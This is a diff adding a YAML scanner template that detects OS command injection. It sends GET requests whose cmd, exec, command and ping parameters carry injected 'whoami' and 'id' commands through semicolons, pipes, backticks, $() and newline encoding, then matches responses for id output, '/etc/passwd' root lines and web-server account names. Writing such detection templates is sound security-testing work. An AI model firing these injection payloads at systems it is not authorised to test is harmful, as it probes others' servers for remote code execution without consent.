@@ -1,0 +1,44 @@
+id: command-injection-basic
+
+info:
+  name: Command Injection - Basic
+  author: Kalkaneus Team
+  severity: critical
+  description: Detects OS command injection vulnerabilities
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  tags: cmdi,command-injection,rce,os-command
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}; whoami"
+      - "{{BaseURL}}{{Path}}| whoami"
+      - "{{BaseURL}}{{Path}}& whoami"
+      - "{{BaseURL}}{{Path}}%0a whoami"
+      - "{{BaseURL}}{{Path}}`whoami`"
+      - "{{BaseURL}}{{Path}}$(whoami)"
+      - "{{BaseURL}}{{Path}}; id"
+      - "{{BaseURL}}{{Path}}| id"
+    
+    payloads:
+      Path:
+        - "?cmd="
+        - "?exec="
+        - "?command="
+        - "?ping="
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\) gid=\\d+\\(\\w+\\)"
+          - "root:x:0:0"
+          
+      - type: word
+        words:
+          - "www-data"
+          - "apache"
+          - "nginx"
+          - "nt authority\\system"
+        condition: or
